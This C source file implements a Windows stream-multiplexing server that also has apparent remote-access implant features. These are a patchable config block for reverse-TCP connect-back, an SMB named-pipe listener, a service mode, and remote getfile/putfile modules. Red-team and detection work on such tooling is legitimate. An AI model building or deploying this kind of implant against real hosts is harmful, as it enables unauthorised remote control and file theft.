/* squatter.c -- the squatter server.
 *
 * Binds a TCP port and, for each connection, runs an sq_session that
 * multiplexes many streams over it. Each stream runs a module (here: "echo")
 * on its own thread behind a message-mode pipe. Drive it with the squatterctl
 * client (//client/cmd/squatterctl).
 *
 *     squatter.exe [port]        (default 9100)
 *
 * This is the smallest transport driver over the runtime: a blocking accept
 * loop handing each socket to a session, which does the framing, mux/demux,
 * streams, and module dispatch.
 */
#include "runtime/channel.h"
#include "modules/echo.h"
#include "modules/getfile.h"
#include "runtime/module.h"
#include "modules/putfile.h"
#include "runtime/session.h"
#include "base/win.h"
#include "sqlog/sqlog.h"

enum { SQ_MAX_SESSIONS = 256 };
enum {
    SQ_HOVEL_TRANSPORT_NONE = 0,
    SQ_HOVEL_TRANSPORT_REVERSE_TCP = 1,
    SQ_HOVEL_TRANSPORT_SMB_PIPE = 2,
    SQ_HOVEL_TRANSPORT_TCP_BIND = 3,
};

typedef struct sq_hovel_build_info {
    char magic[8];
    DWORD version;
    DWORD capabilities;
    DWORD transports;
} sq_hovel_build_info;

typedef struct sq_hovel_config {
    char magic[8];
    DWORD kind;
    BYTE reverse_tcp_host[4];
    WORD reverse_tcp_port;
    wchar_t pipe_name[128];
} sq_hovel_config;

__attribute__((used)) const sq_hovel_build_info squatter_build_info = {
    {'S', 'Q', 'U', 'A', 'T', '0', '0', '1'},
    0x00010000u,
    0x0000001fu,
    0x00000007u,
};

__attribute__((used)) const sq_hovel_config squatter_transport_config = {
    {'S', 'Q', 'C', 'F', 'G', '0', '0', '1'},
    SQ_HOVEL_TRANSPORT_NONE,
    {127u, 0u, 0u, 1u},
    9100u,
    L"\\\\.\\pipe\\squatter",
};

static SOCKET g_listen = INVALID_SOCKET;
static HANDLE g_pipe_listener = INVALID_HANDLE_VALUE;
static volatile int g_stop = 0;
static SERVICE_STATUS_HANDLE g_service_status_handle = NULL;

static void stop_listeners(void);

static BOOL WINAPI on_ctrl(DWORD type)
{
    (void)type;
    stop_listeners();
    return TRUE;
}

static SOCKET listen_on(const wchar_t *port)
{
    ADDRINFOW hints;
    ADDRINFOW *res = NULL;
    SOCKET s = INVALID_SOCKET;
    DWORD yes = 1;

    ZeroMemory(&hints, sizeof hints);
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    if (GetAddrInfoW(NULL, port, &hints, &res) != 0) {
        return INVALID_SOCKET;
    }
    s = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (s != INVALID_SOCKET) {
        (void)setsockopt(s, SOL_SOCKET, SO_REUSEADDR, (const char *)&yes,
                         (int)sizeof yes);
        if (bind(s, res->ai_addr, (int)res->ai_addrlen) != 0 ||
            listen(s, SOMAXCONN) != 0) {
            (void)closesocket(s);
            s = INVALID_SOCKET;
        }
    }
    FreeAddrInfoW(res);
    return s;
}

static int wide_eq(const wchar_t *a, const wchar_t *b)
{
    while (*a != L'\0' && *b != L'\0' && *a == *b) {
        a++;
        b++;
    }
    return *a == *b;
}

static void stop_listeners(void)
{
    g_stop = 1;
    if (g_listen != INVALID_SOCKET) {
        SOCKET s = g_listen;
        g_listen = INVALID_SOCKET;
        (void)closesocket(s);
    }
    if (g_pipe_listener != INVALID_HANDLE_VALUE) {
        HANDLE h = g_pipe_listener;
        g_pipe_listener = INVALID_HANDLE_VALUE;
        (void)CloseHandle(h);
    }
}

static void report_service_status(DWORD state, DWORD exit_code, DWORD wait_hint)
{
    SERVICE_STATUS status;

    if (g_service_status_handle == NULL) {
        return;
    }
    ZeroMemory(&status, sizeof status);
    status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    status.dwCurrentState = state;
    status.dwControlsAccepted =
        (state == SERVICE_RUNNING) ? (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN) : 0;
    status.dwWin32ExitCode = exit_code;
    status.dwWaitHint = wait_hint;
    (void)SetServiceStatus(g_service_status_handle, &status);
}

static DWORD WINAPI on_service_control(DWORD control, DWORD event_type,
                                       LPVOID event_data, LPVOID context)
{
    (void)event_type;
    (void)event_data;
    (void)context;

    if (control == SERVICE_CONTROL_STOP || control == SERVICE_CONTROL_SHUTDOWN) {
        report_service_status(SERVICE_STOP_PENDING, NO_ERROR, 3000);
        stop_listeners();
    }
    return NO_ERROR;
}

static HANDLE create_pipe_instance(const wchar_t *pipe_name)
{
    return CreateNamedPipeW(
        pipe_name,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        PIPE_UNLIMITED_INSTANCES,
        65536,
        65536,
        0,
        NULL);
}

static SOCKET connect_reverse_tcp(const sq_hovel_config *config)
{
    struct sockaddr_in addr;
    SOCKET s = INVALID_SOCKET;

    ZeroMemory(&addr, sizeof addr);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(config->reverse_tcp_port);
    CopyMemory(&addr.sin_addr, config->reverse_tcp_host,
               sizeof config->reverse_tcp_host);

    s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) {
        return INVALID_SOCKET;
    }
    if (connect(s, (const struct sockaddr *)&addr, (int)sizeof addr) != 0) {
        (void)closesocket(s);
        return INVALID_SOCKET;
    }
    return s;
}

static void run_single_session(SOCKET socket, const sq_module_table *table)
{
    sq_channel *ch = NULL;
    sq_session *session = NULL;

    ch = sq_channel_from_socket(socket);
    if (ch == NULL) {
        (void)closesocket(socket);
        return;
    }
    session = sq_session_create(ch, table);
    if (session == NULL) {
        sq_channel_free(ch);
        return;
    }
    while (!g_stop) {
        Sleep(250);
    }
    sq_session_destroy(session);
}

static void reap_done_sessions(sq_session **sessions, int *session_count)
{
    int i = 0;

    while (i < *session_count) {
        if (sq_session_done(sessions[i])) {
            sq_session_destroy(sessions[i]);
            sessions[i] = sessions[*session_count - 1];
            sessions[*session_count - 1] = NULL;
            (*session_count)--;
            continue;
        }
        i++;
    }
}

static void run_named_pipe_server(const wchar_t *pipe_name,
                                  const sq_module_table *table)
{
    sq_session *sessions[SQ_MAX_SESSIONS];
    int session_count = 0;
    int i = 0;

    ZeroMemory(sessions, sizeof sessions);
    SQLOG_INFO(SQLOG_SUB_MUX,
               L"listening on named pipe %s; connect over SMB as \\\\HOST\\pipe\\...",
               pipe_name);

    while (!g_stop) {
        HANDLE pipe = create_pipe_instance(pipe_name);
        BOOL connected = FALSE;
        sq_channel *ch = NULL;
        sq_session *s = NULL;

        reap_done_sessions(sessions, &session_count);
        g_pipe_listener = pipe;
        if (pipe == INVALID_HANDLE_VALUE) {
            SQLOG_WINERR(SQLOG_SUB_MUX, ERROR, GetLastError(),
                         L"CreateNamedPipeW failed");
            break;
        }

        connected = ConnectNamedPipe(pipe, NULL);
        if (connected == FALSE) {
            DWORD const err = GetLastError();
            if (err == ERROR_PIPE_CONNECTED) {
                connected = TRUE;
            } else {
                (void)CloseHandle(pipe);
                if (g_stop || err == ERROR_OPERATION_ABORTED ||
                    err == ERROR_INVALID_HANDLE) {
                    break;
                }
                SQLOG_WINERR(SQLOG_SUB_MUX, ERROR, err,
                             L"ConnectNamedPipe failed");
                continue;
            }
        }

        g_pipe_listener = INVALID_HANDLE_VALUE;
        if (connected == FALSE) {
            (void)CloseHandle(pipe);
            continue;
        }

        SQLOG_INFO(SQLOG_SUB_MUX, L"named-pipe connection accepted");
        ch = sq_channel_from_handle(pipe);
        if (ch == NULL) {
            (void)CloseHandle(pipe);
            continue;
        }
        s = sq_session_create(ch, table);
        if (s == NULL) {
            sq_channel_free(ch);
            continue;
        }
        reap_done_sessions(sessions, &session_count);
        if (session_count < SQ_MAX_SESSIONS) {
            sessions[session_count++] = s;
        } else {
            SQLOG_ERROR(SQLOG_SUB_MUX, L"session capacity reached; dropping pipe connection");
            sq_session_destroy(s);
        }
    }

    SQLOG_INFO(SQLOG_SUB_MUX, L"shutting down (%d pipe session(s))", session_count);
    for (i = 0; i < session_count; i++) {
        sq_session_destroy(sessions[i]);
    }
}

static int run_tcp_bind_server(const wchar_t *port, const sq_module_table *table)
{
    sq_session *sessions[SQ_MAX_SESSIONS];
    int session_count = 0;
    int i = 0;

    ZeroMemory(sessions, sizeof sessions);
    g_listen = listen_on(port);
    if (g_listen == INVALID_SOCKET) {
        SQLOG_ERROR(SQLOG_SUB_MUX, L"failed to listen on port %s (in use?)", port);
        return 1;
    }
    SQLOG_INFO(SQLOG_SUB_MUX,
               L"listening on port %s (module: echo); Ctrl-C to stop", port);

    while (!g_stop) {
        SOCKET client = INVALID_SOCKET;
        sq_channel *ch = NULL;
        sq_session *s = NULL;

        reap_done_sessions(sessions, &session_count);
        client = accept(g_listen, NULL, NULL);
        if (client == INVALID_SOCKET) {
            if (g_stop) {
                break;
            }
            continue;
        }
        SQLOG_INFO(SQLOG_SUB_MUX, L"connection accepted");
        ch = sq_channel_from_socket(client);
        if (ch == NULL) {
            (void)closesocket(client);
            continue;
        }
        s = sq_session_create(ch, table);
        if (s == NULL) {
            sq_channel_free(ch);
            continue;
        }
        reap_done_sessions(sessions, &session_count);
        if (session_count < SQ_MAX_SESSIONS) {
            sessions[session_count++] = s;
        } else {
            SQLOG_ERROR(SQLOG_SUB_MUX, L"session capacity reached; dropping connection");
            sq_session_destroy(s);
        }
    }

    SQLOG_INFO(SQLOG_SUB_MUX, L"shutting down (%d session(s))", session_count);
    for (i = 0; i < session_count; i++) {
        sq_session_destroy(sessions[i]);
    }
    return 0;
}

static const wchar_t *configured_port(const sq_hovel_config *config,
                                      wchar_t port_buffer[16])
{
    if ((config->kind == SQ_HOVEL_TRANSPORT_REVERSE_TCP ||
         config->kind == SQ_HOVEL_TRANSPORT_TCP_BIND) &&
        config->reverse_tcp_port != 0) {
        (void)wnsprintfW(port_buffer, 16, L"%u",
                         (unsigned)config->reverse_tcp_port);
        return port_buffer;
    }
    return L"9100";
}

typedef struct sq_service_context {
    wchar_t *service_name;
    const wchar_t *port;
    const sq_module_table *table;
} sq_service_context;

static sq_service_context g_service_context;

static void WINAPI service_main(DWORD argc, LPWSTR *argv)
{
    WSADATA wsa;
    int rc = 1;

    (void)argc;
    (void)argv;

    g_service_status_handle = RegisterServiceCtrlHandlerExW(
        g_service_context.service_name, on_service_control, NULL);
    if (g_service_status_handle == NULL) {
        return;
    }
    report_service_status(SERVICE_START_PENDING, NO_ERROR, 3000);
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        report_service_status(SERVICE_STOPPED, ERROR_SERVICE_SPECIFIC_ERROR, 0);
        return;
    }
    report_service_status(SERVICE_RUNNING, NO_ERROR, 0);
    rc = run_tcp_bind_server(g_service_context.port, g_service_context.table);
    (void)WSACleanup();
    report_service_status(SERVICE_STOPPED,
                          (rc == 0) ? NO_ERROR : ERROR_SERVICE_SPECIFIC_ERROR,
                          0);
}

static int run_as_service(wchar_t *service_name, const wchar_t *port,
                          const sq_module_table *table)
{
    SERVICE_TABLE_ENTRYW dispatch[2];

    g_service_context.service_name = service_name;
    g_service_context.port = port;
    g_service_context.table = table;
    dispatch[0].lpServiceName = service_name;
    dispatch[0].lpServiceProc = service_main;
    dispatch[1].lpServiceName = NULL;
    dispatch[1].lpServiceProc = NULL;
    if (StartServiceCtrlDispatcherW(dispatch) != 0) {
        return 0;
    }
    SQLOG_WINERR(SQLOG_SUB_MUX, ERROR, GetLastError(),
                 L"StartServiceCtrlDispatcherW failed; falling back to console mode");
    return -1;
}

int wmain(int argc, wchar_t **argv); /* -municode entry; declare to satisfy -Wmissing-prototypes */

int wmain(int argc, wchar_t **argv)
{
    static const sq_module modules[] = {
        {"echo", sq_echo_module_main},
        {"getfile", sq_getfile_module_main},
        {"putfile", sq_putfile_module_main},
    };
    static const sq_module_table table = {
        modules, (int)(sizeof modules / sizeof modules[0])};
    wchar_t configured_port_buffer[16];
    const wchar_t *port = configured_port(&squatter_transport_config, configured_port_buffer);
    wchar_t *service_name = NULL;
    WSADATA wsa;
    int i = 0;

    for (i = 1; i < argc; i++) {
        if (wide_eq(argv[i], L"--service") && i + 1 < argc) {
            service_name = argv[++i];
        } else if (argv[i][0] != L'\0') {
            port = argv[i];
        }
    }

    sqlog_init();
    sqlog_set_level(SQLOG_LEVEL_INFO);

    if (service_name != NULL) {
        int service_rc = run_as_service(service_name, port, &table);
        if (service_rc == 0) {
            sqlog_shutdown();
            return 0;
        }
    }

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        SQLOG_ERROR(SQLOG_SUB_MUX, L"WSAStartup failed");
        return 1;
    }
    (void)SetConsoleCtrlHandler(on_ctrl, TRUE);
    if (squatter_transport_config.kind == SQ_HOVEL_TRANSPORT_REVERSE_TCP) {
        SOCKET peer = connect_reverse_tcp(&squatter_transport_config);
        if (peer == INVALID_SOCKET) {
            SQLOG_ERROR(SQLOG_SUB_MUX, L"failed to connect reverse TCP session");
            (void)WSACleanup();
            return 1;
        }
        SQLOG_INFO(SQLOG_SUB_MUX, L"reverse TCP session connected");
        run_single_session(peer, &table);
        (void)WSACleanup();
        sqlog_shutdown();
        return 0;
    }
    if (squatter_transport_config.kind == SQ_HOVEL_TRANSPORT_SMB_PIPE) {
        run_named_pipe_server(squatter_transport_config.pipe_name, &table);
        (void)WSACleanup();
        sqlog_shutdown();
        return 0;
    }
    i = run_tcp_bind_server(port, &table);
    (void)WSACleanup();
    sqlog_shutdown();
    return i;
}
